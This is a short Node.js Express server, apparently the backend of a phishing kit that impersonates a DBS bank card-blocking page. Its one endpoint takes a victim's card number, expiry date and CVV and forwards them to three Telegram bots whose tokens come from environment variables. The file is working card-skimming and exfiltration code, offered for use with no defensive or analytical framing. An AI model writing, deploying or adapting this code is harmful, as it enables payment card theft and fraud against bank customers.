const express = require('express');
const fetch = require('node-fetch');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.post('/kirim-ke-telegram', async (req, res) => {
  const { nomor, valid, cvv } = req.body;

  const message = `🚫 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
  const bots = [
    { token: process.env.BOT_TOKEN_1, chat_id: process.env.CHAT_ID_1 },
    { token: process.env.BOT_TOKEN_2, chat_id: process.env.CHAT_ID_2 },
    { token: process.env.BOT_TOKEN_3, chat_id: process.env.CHAT_ID_3 }
  ];

  try {
    await Promise.all(bots.map(bot => {
      return fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: bot.chat_id, text: message, parse_mode: "Markdown" })
      });
    }));

    res.sendStatus(200);
  } catch (err) {
    res.status(500).send("Gagal kirim ke salah satu bot: " + err.message);
  }
});

app.listen(3000, () => {
  console.log("Server aktif di http://localhost:3000");
});
